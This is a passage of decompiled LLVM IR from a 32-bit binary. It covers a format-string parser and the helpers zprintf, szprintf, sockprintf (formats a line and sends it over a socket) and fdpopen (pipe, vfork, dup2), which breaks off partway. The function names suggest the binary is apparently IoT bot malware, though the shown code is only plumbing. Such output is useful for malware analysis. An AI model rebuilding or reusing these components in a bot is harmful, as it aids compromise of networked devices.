  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048717, align 4
  %v0_804871a = load i32, i32* %eax.global-to-local, align 4
  %v2_804871a = add i32 %v0_8048850, -12
  %v3_804871a = inttoptr i32 %v2_804871a to i32*
  store i32 %v0_804871a, i32* %v3_804871a, align 4
  %v5_804871b = add i32 %v0_8048850, -16
  %v6_804871b = inttoptr i32 %v5_804871b to i32*
  store i32 %tmp3, i32* %v6_804871b, align 4
  %v5_804871e = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804871e = call i32 @prints(i32 %v4_8048711, i8* %v5_804871e, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804871e, i32* %eax.global-to-local, align 4
  %v0_8048723 = load i32, i32* @esp, align 4
  %v1_8048723 = add i32 %v0_8048723, 16
  %v5_8048726 = add i32 %v6_804871e, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_804872e:                             ; preds = %dec_label_pc_80486e3
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048731 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048731 = zext i8 %v2_8048731 to i32
  %v6_8048731 = or i32 %v3_8048731, %v5_80486d4.lcssa
  store i32 %v6_8048731, i32* %eax.global-to-local, align 4
  %v10_8048733 = icmp eq i8 %v2_8048731, 100
  %v1_8048735 = icmp eq i1 %v10_8048733, false
  br i1 %v1_8048735, label %dec_label_pc_8048767, label %dec_label_pc_8048737

dec_label_pc_8048737:                             ; preds = %dec_label_pc_804872e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804873a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048742 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048742 = load i32, i32* %v1_8048742, align 4
  store i32 %v2_8048742, i32* %eax.global-to-local, align 4
  %v1_8048747 = add i32 %v0_8048850, -8
  %v2_8048747 = inttoptr i32 %v1_8048747 to i32*
  store i32 97, i32* %v2_8048747, align 4
  %v5_8048749 = add i32 %v0_8048850, -12
  %v6_8048749 = inttoptr i32 %v5_8048749 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048749, align 4
  %v5_804874c = add i32 %v0_8048850, -16
  %v6_804874c = inttoptr i32 %v5_804874c to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804874c, align 4
  %v1_804874f = add i32 %v0_8048850, -20
  %v2_804874f = inttoptr i32 %v1_804874f to i32*
  store i32 1, i32* %v2_804874f, align 4
  %v1_8048751 = add i32 %v0_8048850, -24
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 10, i32* %v2_8048751, align 4
  %v0_8048753 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048753 = add i32 %v0_8048850, -28
  %v3_8048753 = inttoptr i32 %v2_8048753 to i32*
  store i32 %v0_8048753, i32* %v3_8048753, align 4
  %v5_8048754 = add i32 %v0_8048850, -32
  %v6_8048754 = inttoptr i32 %v5_8048754 to i32*
  store i32 %tmp3, i32* %v6_8048754, align 4
  %v1_8048757 = call i32 @printi(i32 %v1_804873a)
  store i32 %v1_8048757, i32* %eax.global-to-local, align 4
  %v0_804875c = load i32, i32* @esp, align 4
  %v1_804875c = add i32 %v0_804875c, 32
  %v5_804875f = add i32 %v1_8048757, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_8048767:                             ; preds = %dec_label_pc_804872e
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_804876a = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804876a = zext i8 %v2_804876a to i32
  %v6_804876a = or i32 %v3_804876a, %v5_80486d4.lcssa
  store i32 %v6_804876a, i32* %eax.global-to-local, align 4
  %v10_804876c = icmp eq i8 %v2_804876a, 120
  %v1_804876e = icmp eq i1 %v10_804876c, false
  br i1 %v1_804876e, label %dec_label_pc_80487a0, label %dec_label_pc_8048770

dec_label_pc_8048770:                             ; preds = %dec_label_pc_8048767
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048773 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804877b = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804877b = load i32, i32* %v1_804877b, align 4
  store i32 %v2_804877b, i32* %eax.global-to-local, align 4
  %v1_8048780 = add i32 %v0_8048850, -8
  %v2_8048780 = inttoptr i32 %v1_8048780 to i32*
  store i32 97, i32* %v2_8048780, align 4
  %v5_8048782 = add i32 %v0_8048850, -12
  %v6_8048782 = inttoptr i32 %v5_8048782 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048782, align 4
  %v5_8048785 = add i32 %v0_8048850, -16
  %v6_8048785 = inttoptr i32 %v5_8048785 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048785, align 4
  %v1_8048788 = add i32 %v0_8048850, -20
  %v2_8048788 = inttoptr i32 %v1_8048788 to i32*
  store i32 0, i32* %v2_8048788, align 4
  %v1_804878a = add i32 %v0_8048850, -24
  %v2_804878a = inttoptr i32 %v1_804878a to i32*
  store i32 16, i32* %v2_804878a, align 4
  %v0_804878c = load i32, i32* %eax.global-to-local, align 4
  %v2_804878c = add i32 %v0_8048850, -28
  %v3_804878c = inttoptr i32 %v2_804878c to i32*
  store i32 %v0_804878c, i32* %v3_804878c, align 4
  %v5_804878d = add i32 %v0_8048850, -32
  %v6_804878d = inttoptr i32 %v5_804878d to i32*
  store i32 %tmp3, i32* %v6_804878d, align 4
  %v1_8048790 = call i32 @printi(i32 %v1_8048773)
  store i32 %v1_8048790, i32* %eax.global-to-local, align 4
  %v0_8048795 = load i32, i32* @esp, align 4
  %v1_8048795 = add i32 %v0_8048795, 32
  %v5_8048798 = add i32 %v1_8048790, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_80487a0:                             ; preds = %dec_label_pc_8048767
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487a3 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487a3 = zext i8 %v2_80487a3 to i32
  %v6_80487a3 = or i32 %v3_80487a3, %v5_80486d4.lcssa
  store i32 %v6_80487a3, i32* %eax.global-to-local, align 4
  %v10_80487a5 = icmp eq i8 %v2_80487a3, 88
  %v1_80487a7 = icmp eq i1 %v10_80487a5, false
  br i1 %v1_80487a7, label %dec_label_pc_80487d9, label %dec_label_pc_80487a9

dec_label_pc_80487a9:                             ; preds = %dec_label_pc_80487a0
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80487ac = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487b4 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487b4 = load i32, i32* %v1_80487b4, align 4
  store i32 %v2_80487b4, i32* %eax.global-to-local, align 4
  %v1_80487b9 = add i32 %v0_8048850, -8
  %v2_80487b9 = inttoptr i32 %v1_80487b9 to i32*
  store i32 65, i32* %v2_80487b9, align 4
  %v5_80487bb = add i32 %v0_8048850, -12
  %v6_80487bb = inttoptr i32 %v5_80487bb to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487bb, align 4
  %v5_80487be = add i32 %v0_8048850, -16
  %v6_80487be = inttoptr i32 %v5_80487be to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487be, align 4
  %v1_80487c1 = add i32 %v0_8048850, -20
  %v2_80487c1 = inttoptr i32 %v1_80487c1 to i32*
  store i32 0, i32* %v2_80487c1, align 4
  %v1_80487c3 = add i32 %v0_8048850, -24
  %v2_80487c3 = inttoptr i32 %v1_80487c3 to i32*
  store i32 16, i32* %v2_80487c3, align 4
  %v0_80487c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80487c5 = add i32 %v0_8048850, -28
  %v3_80487c5 = inttoptr i32 %v2_80487c5 to i32*
  store i32 %v0_80487c5, i32* %v3_80487c5, align 4
  %v5_80487c6 = add i32 %v0_8048850, -32
  %v6_80487c6 = inttoptr i32 %v5_80487c6 to i32*
  store i32 %tmp3, i32* %v6_80487c6, align 4
  %v1_80487c9 = call i32 @printi(i32 %v1_80487ac)
  store i32 %v1_80487c9, i32* %eax.global-to-local, align 4
  %v0_80487ce = load i32, i32* @esp, align 4
  %v1_80487ce = add i32 %v0_80487ce, 32
  %v5_80487d1 = add i32 %v1_80487c9, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_80487d9:                             ; preds = %dec_label_pc_80487a0
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487dc = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487dc = zext i8 %v2_80487dc to i32
  %v6_80487dc = or i32 %v3_80487dc, %v5_80486d4.lcssa
  store i32 %v6_80487dc, i32* %eax.global-to-local, align 4
  %v10_80487de = icmp eq i8 %v2_80487dc, 117
  %v1_80487e0 = icmp eq i1 %v10_80487de, false
  br i1 %v1_80487e0, label %dec_label_pc_804880f, label %dec_label_pc_80487e2

dec_label_pc_80487e2:                             ; preds = %dec_label_pc_80487d9
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80487e5 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487ed = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487ed = load i32, i32* %v1_80487ed, align 4
  store i32 %v2_80487ed, i32* %eax.global-to-local, align 4
  %v1_80487f2 = add i32 %v0_8048850, -8
  %v2_80487f2 = inttoptr i32 %v1_80487f2 to i32*
  store i32 97, i32* %v2_80487f2, align 4
  %v5_80487f4 = add i32 %v0_8048850, -12
  %v6_80487f4 = inttoptr i32 %v5_80487f4 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487f4, align 4
  %v5_80487f7 = add i32 %v0_8048850, -16
  %v6_80487f7 = inttoptr i32 %v5_80487f7 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487f7, align 4
  %v1_80487fa = add i32 %v0_8048850, -20
  %v2_80487fa = inttoptr i32 %v1_80487fa to i32*
  store i32 0, i32* %v2_80487fa, align 4
  %v1_80487fc = add i32 %v0_8048850, -24
  %v2_80487fc = inttoptr i32 %v1_80487fc to i32*
  store i32 10, i32* %v2_80487fc, align 4
  %v0_80487fe = load i32, i32* %eax.global-to-local, align 4
  %v2_80487fe = add i32 %v0_8048850, -28
  %v3_80487fe = inttoptr i32 %v2_80487fe to i32*
  store i32 %v0_80487fe, i32* %v3_80487fe, align 4
  %v5_80487ff = add i32 %v0_8048850, -32
  %v6_80487ff = inttoptr i32 %v5_80487ff to i32*
  store i32 %tmp3, i32* %v6_80487ff, align 4
  %v1_8048802 = call i32 @printi(i32 %v1_80487e5)
  store i32 %v1_8048802, i32* %eax.global-to-local, align 4
  %v0_8048807 = load i32, i32* @esp, align 4
  %v1_8048807 = add i32 %v0_8048807, 32
  %v5_804880a = add i32 %v1_8048802, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_804880f:                             ; preds = %dec_label_pc_80487d9
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048812 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048812 = zext i8 %v2_8048812 to i32
  %v6_8048812 = or i32 %v3_8048812, %v5_80486d4.lcssa
  store i32 %v6_8048812, i32* %eax.global-to-local, align 4
  %v10_8048814 = icmp eq i8 %v2_8048812, 99
  %v1_8048816 = icmp eq i1 %v10_8048814, false
  br i1 %v1_8048816, label %dec_label_pc_8048862, label %dec_label_pc_8048818

dec_label_pc_8048818:                             ; preds = %dec_label_pc_804880f
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804881b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048823 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048823 = load i32, i32* %v1_8048823, align 4
  store i32 %v2_8048823, i32* %stack_var_-6, align 4
  %v5_804882c = add i32 %v0_8048850, -4
  %v6_804882c = inttoptr i32 %v5_804882c to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804882c, align 4
  %v5_804882f = add i32 %v0_8048850, -8
  %v6_804882f = inttoptr i32 %v5_804882f to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804882f, align 4
  store i32 %v2_8048832, i32* %eax.global-to-local, align 4
  %v2_8048835 = add i32 %v0_8048850, -12
  %v3_8048835 = inttoptr i32 %v2_8048835 to i32*
  store i32 %v2_8048832, i32* %v3_8048835, align 4
  %v5_8048836 = add i32 %v0_8048850, -16
  %v6_8048836 = inttoptr i32 %v5_8048836 to i32*
  store i32 %tmp3, i32* %v6_8048836, align 4
  %v0_8048839 = load i32, i32* %stack_var_-6, align 4
  %v6_8048839 = call i32 @prints(i32 %v0_8048839, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048839, i32* %eax.global-to-local, align 4
  %v0_804883e = load i32, i32* @esp, align 4
  %v1_804883e = add i32 %v0_804883e, 16
  %v5_8048841 = add i32 %v6_8048839, %stack_var_-28.154
  br label %dec_label_pc_8048862

dec_label_pc_8048846:                             ; preds = %dec_label_pc_8048679, %dec_label_pc_804864f
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_804864f ], [ %v22_804865c, %dec_label_pc_8048679 ]
  %v4_8048846 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_8048846, i32* %eax.global-to-local, align 4
  %v2_8048849 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048849 = zext i8 %v2_8048849 to i32
  store i32 %v3_8048849, i32* %eax.global-to-local, align 4
  %v2_8048853 = add i32 %v0_8048850, -12
  %v3_8048853 = inttoptr i32 %v2_8048853 to i32*
  store i32 %v3_8048849, i32* %v3_8048853, align 4
  %v5_8048854 = add i32 %v0_8048850, -16
  %v6_8048854 = inttoptr i32 %v5_8048854 to i32*
  store i32 %tmp3, i32* %v6_8048854, align 4
  %v2_8048857 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_8048857 = call i32 @printchar(i32* %v2_8048857, i32 %stack_var_-24.151)
  store i32 %v3_8048857, i32* %eax.global-to-local, align 4
  %v0_804885c = load i32, i32* @esp, align 4
  %v1_804885c = add i32 %v0_804885c, 16
  %v4_804885f = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_8048862

dec_label_pc_8048862:                             ; preds = %dec_label_pc_804880f, %dec_label_pc_8048818, %dec_label_pc_80487e2, %dec_label_pc_80487a9, %dec_label_pc_8048770, %dec_label_pc_8048737, %dec_label_pc_8048711, %dec_label_pc_8048846
  %v4_804871466 = phi i32 [ %v1_804885c, %dec_label_pc_8048846 ], [ %v0_8048850, %dec_label_pc_804880f ], [ %v1_804883e, %dec_label_pc_8048818 ], [ %v1_8048807, %dec_label_pc_80487e2 ], [ %v1_80487ce, %dec_label_pc_80487a9 ], [ %v1_8048795, %dec_label_pc_8048770 ], [ %v1_804875c, %dec_label_pc_8048737 ], [ %v1_8048723, %dec_label_pc_8048711 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_8048846 ], [ %stack_var_-24.151, %dec_label_pc_804880f ], [ %stack_var_-24.151, %dec_label_pc_8048818 ], [ %stack_var_-24.151, %dec_label_pc_80487e2 ], [ %stack_var_-24.151, %dec_label_pc_80487a9 ], [ %stack_var_-24.151, %dec_label_pc_8048770 ], [ %stack_var_-24.151, %dec_label_pc_8048737 ], [ %v2_80486f7, %dec_label_pc_8048711 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_8048846 ], [ %stack_var_12.152, %dec_label_pc_804880f ], [ %v1_804881b, %dec_label_pc_8048818 ], [ %v1_80487e5, %dec_label_pc_80487e2 ], [ %v1_80487ac, %dec_label_pc_80487a9 ], [ %v1_8048773, %dec_label_pc_8048770 ], [ %v1_804873a, %dec_label_pc_8048737 ], [ %v1_80486ef, %dec_label_pc_8048711 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048846 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804880f ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048818 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487e2 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487a9 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048770 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048737 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048711 ]
  %stack_var_-28.0 = phi i32 [ %v4_804885f, %dec_label_pc_8048846 ], [ %stack_var_-28.154, %dec_label_pc_804880f ], [ %v5_8048841, %dec_label_pc_8048818 ], [ %v5_804880a, %dec_label_pc_80487e2 ], [ %v5_80487d1, %dec_label_pc_80487a9 ], [ %v5_8048798, %dec_label_pc_8048770 ], [ %v5_804875f, %dec_label_pc_8048737 ], [ %v5_8048726, %dec_label_pc_8048711 ]
  %v4_8048862 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048862 = add i32 %v4_8048862, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048862 to i8*
  store i32 %v5_8048862, i32* %eax.global-to-local, align 4
  %v2_8048868 = load i8, i8* %stack_var_8.4, align 1
  %v3_8048868 = zext i8 %v2_8048868 to i32
  %v5_8048868 = and i32 %v5_8048862, -256
  %v6_8048868 = or i32 %v3_8048868, %v5_8048868
  store i32 %v6_8048868, i32* %eax.global-to-local, align 4
  %v4_804886a = icmp eq i8 %v2_8048868, 0
  %v1_804886c = icmp eq i1 %v4_804886a, false
  br i1 %v1_804886c, label %dec_label_pc_804864f, label %dec_label_pc_8048872

dec_label_pc_8048872:                             ; preds = %dec_label_pc_8048862, %dec_label_pc_804865c, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_804865c ], [ %stack_var_-28.0, %dec_label_pc_8048862 ]
  %v4_8048872 = icmp eq i32* %arg1, null
  br i1 %v4_8048872, label %dec_label_pc_8048880, label %dec_label_pc_8048878

dec_label_pc_8048878:                             ; preds = %dec_label_pc_8048872
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_804887b = load i32, i32* %arg1, align 4
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v1_804887d = inttoptr i32 %v2_804887b to i8*
  store i8 0, i8* %v1_804887d, align 1
  br label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_8048872, %dec_label_pc_8048878
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048883 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048883, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048868, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048862, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80486f7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_80486d4.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_80486d1.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804869b, { 1, 2, 3, 0 }
  uselistorder i8* %v22_804865c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_8048850, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 58, 59, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 46, 47, 43, 63, 62, 48, 49, 61, 60, 50, 51, 52, 53, 54, 55, 56, 57, 65, 64 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8048880, { 1, 0 }
  uselistorder label %dec_label_pc_8048862, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8048711, { 1, 0 }
  uselistorder label %dec_label_pc_80486e3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486da, { 1, 0 }
  uselistorder label %dec_label_pc_804869b, { 1, 0 }
  uselistorder label %dec_label_pc_804864f, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_804888e = ptrtoint i32* %stack_var_8 to i32
  %v4_804889d = call i32 @print(i32* null, i32 %arg1, i32 %v4_804888e)
  ret i32 %v4_804889d
}

define i32 @szprintf() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_80488b0 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488c1 = call i32 @print(i32* nonnull %stack_var_4, i32 %tmp, i32 %v4_80488b0)
  ret i32 %v4_80488c1
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_80488ce = load i32, i32* @edi, align 4
  %v1_80488da = call i32 @malloc(i32 2048)
  store i32 %v1_80488da, i32* %stack_var_-20, align 4
  %v3_80488f6 = inttoptr i32 %v1_80488da to i8*
  %v4_80488f6 = call i32 @__GI_memset(i8* %v3_80488f6, i32 0, i32 2048)
  %v4_8048907 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048919 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048907)
  %v3_8048932 = call i32 @_strlen(i8* %v3_80488f6)
  %v6_8048939 = add i32 %v1_80488da, %v3_8048932
  %v1_804893c = inttoptr i32 %v6_8048939 to i8*
  store i8 10, i8* %v1_804893c, align 1
  store i32 %v1_80488da, i32* @edi, align 4
  %v3_8048950 = call i32 @_strlen(i8* %v3_80488f6)
  %v4_8048963 = call i32 @__libc_send(i32 %arg1, i32 %v1_80488da, i32 %v3_8048950, i32 16384)
  %v1_8048974 = call i32 @free(i32 %v1_80488da)
  store i32 %v0_80488ce, i32* @edi, align 4
  ret i32 %v4_8048963

; uselistorder directives
  uselistorder i32 %v1_80488da, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048987 = load i32, i32* @edi, align 4
  store i32 %v0_8048987, i32* %stack_var_-8, align 4
  %v4_804898b = ptrtoint i8* %tmp24 to i32
  %v2_804898e = load i8, i8* %tmp24, align 1
  %v10_8048990 = icmp eq i8 %v2_804898e, 114
  br i1 %v10_8048990, label %dec_label_pc_804899d, label %dec_label_pc_8048994

dec_label_pc_8048994:                             ; preds = %entry
  %v2_8048997 = load i8, i8* %tmp24, align 1
  %v10_8048999 = icmp eq i8 %v2_8048997, 119
  %v1_804899b = icmp eq i1 %v10_8048999, false
  br i1 %v1_804899b, label %dec_label_pc_8048b72, label %dec_label_pc_804899d

dec_label_pc_804899d:                             ; preds = %dec_label_pc_8048994, %entry
  %v1_80489a0 = add i32 %v4_804898b, 1
  %v1_80489a1 = inttoptr i32 %v1_80489a0 to i8*
  %v2_80489a1 = load i8, i8* %v1_80489a1, align 1
  %v4_80489a3 = icmp eq i8 %v2_80489a1, 0
  br i1 %v4_80489a3, label %dec_label_pc_80489b3, label %dec_label_pc_8048b72

dec_label_pc_80489b3:                             ; preds = %dec_label_pc_804899d
  %v2_80489b6 = ptrtoint i32* %stack_var_-24 to i32
  %v1_80489ba = call i32 @__GI_pipe(i32 %v2_80489b6)
  %v2_80489c2 = icmp slt i32 %v1_80489ba, 0
  %v1_80489c4 = icmp eq i1 %v2_80489c2, false
  br i1 %v1_80489c4, label %dec_label_pc_80489d2, label %dec_label_pc_8048b72

dec_label_pc_80489d2:                             ; preds = %dec_label_pc_80489b3
  %v0_80489d2 = load i8*, i8** @global_var_8059440.19, align 4
  %v2_80489d7 = icmp eq i8* %v0_80489d2, null
  %v1_80489d9 = icmp eq i1 %v2_80489d7, false
  br i1 %v1_80489d9, label %bb, label %dec_label_pc_80489db

dec_label_pc_80489db:                             ; preds = %dec_label_pc_80489d2
  %v1_80489db = call i32 @getdtablesize(i32 %tmp23)
  %tmp37 = icmp slt i32 %v1_80489db, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_80489f5, label %dec_label_pc_8048b72

dec_label_pc_80489f5:                             ; preds = %dec_label_pc_80489db
  %v2_80489f8 = mul i32 %v1_80489db, 4
  %v1_80489ff = call i32 @malloc(i32 %v2_80489f8)
  %v1_8048a07 = inttoptr i32 %v1_80489ff to i8*
  store i8* %v1_8048a07, i8** @global_var_8059440.19, align 64
  %v2_8048a11 = icmp eq i32 %v1_80489ff, 0
  %v1_8048a13 = icmp eq i1 %v2_8048a11, false
  br i1 %v1_8048a13, label %dec_label_pc_8048a21, label %dec_label_pc_8048b72

dec_label_pc_8048a21:                             ; preds = %dec_label_pc_80489f5
  %v1_8048a24 = mul i32 %v1_80489db, 4
  store i32 %v1_80489ff, i32* @edi, align 4
  %v1_8048a35 = and i32 %v1_80489ff, -256
  %v5_8048a37 = call i8* @_memset(i8* %v1_8048a07, i32 %v1_8048a35, i32 %v1_8048a24)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489d2, %dec_label_pc_8048a21
  %v0_8048a39 = call i32 @__vfork()
  %v13_8048a47 = icmp eq i32 %v0_8048a39, -1
  br i1 %v13_8048a47, label %dec_label_pc_8048a58, label %dec_label_pc_8048a4d

dec_label_pc_8048a4d:                             ; preds = %bb
  %v4_8048a4d = icmp eq i32 %v0_8048a39, 0
  %v2_8048a85 = load i8, i8* %tmp24, align 1
  %v10_8048a87 = icmp eq i8 %v2_8048a85, 114
  %v1_8048a89 = icmp eq i1 %v10_8048a87, false
  br i1 %v4_8048a4d, label %dec_label_pc_8048a82, label %dec_label_pc_8048b23

dec_label_pc_8048a58:                             ; preds = %bb
  %v3_8048a58 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a5f = call i32 @__libc_close(i32 %v3_8048a58)
  %v1_8048a6e = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048b72

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_8048a4d
  br i1 %v1_8048a89, label %dec_label_pc_8048ac4, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v9_8048a8e = icmp eq i32 %tmp19, 1
  br i1 %v9_8048a8e, label %dec_label_pc_8048a8b.dec_label_pc_8048ab3_crit_edge, label %dec_label_pc_8048a93

dec_label_pc_8048a8b.dec_label_pc_8048ab3_crit_edge: ; preds = %dec_label_pc_8048a8b
  br label %dec_label_pc_8048ab3

dec_label_pc_8048a93:                             ; preds = %dec_label_pc_8048a8b
  %v2_8048a9c = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048aab = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab3

dec_label_pc_8048ab3:                             ; preds = %dec_label_pc_8048a8b.dec_label_pc_8048ab3_crit_edge, %dec_label_pc_8048a93
  %v3_8048ab3 = load i32, i32* %stack_var_-24, align 4
  %v1_8048aba = call i32 @__libc_close(i32 %v3_8048ab3)
  br label %dec_label_pc_8048afa

dec_label_pc_8048ac4:                             ; preds = %dec_label_pc_8048a82
  %v3_8048ac4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ac7 = icmp eq i32 %v3_8048ac4, 0
  br i1 %v1_8048ac7, label %dec_label_pc_8048ac4.dec_label_pc_8048aeb_crit_edge, label %dec_label_pc_8048acb

dec_label_pc_8048ac4.dec_label_pc_8048aeb_crit_edge: ; preds = %dec_label_pc_8048ac4
  br label %dec_label_pc_8048aeb

